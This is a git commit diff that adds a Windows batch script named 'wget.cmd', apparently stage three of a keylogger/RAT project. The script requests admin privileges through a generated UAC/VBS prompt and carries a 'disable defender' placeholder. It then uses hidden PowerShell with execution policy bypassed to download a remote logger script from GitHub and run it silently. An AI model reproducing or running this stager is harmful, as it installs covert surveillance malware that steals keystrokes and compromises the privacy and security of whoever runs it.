91792b2ed8e6b77371536a9eb6dcc54d9bdf77d6
Soumyo001 <www.soumyo@gmail.com>
2025-01-21 14:52:39 -0800

    initial stage-3

---
+++ wget.cmd
@@ -0,0 +1,35 @@
+REM get admin permissions for script
+@echo off
+:: BatchGotAdmin
+:-------------------------------------
+REM  --> check for permissions
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+REM --> if error flag set, we do not have admin.
+if '%errorlevel%' NEQ '0' (
+    echo Requesting administrative privileges...
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+REM disable defender
+
+REM rat resources
+powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Duckey-Logger-Retried/refs/heads/main/logger.ps1' -outfile '.\install.ps1'"
+powershell -ep bypass -noP start-process -windowstyle hidden ".\install.ps1"
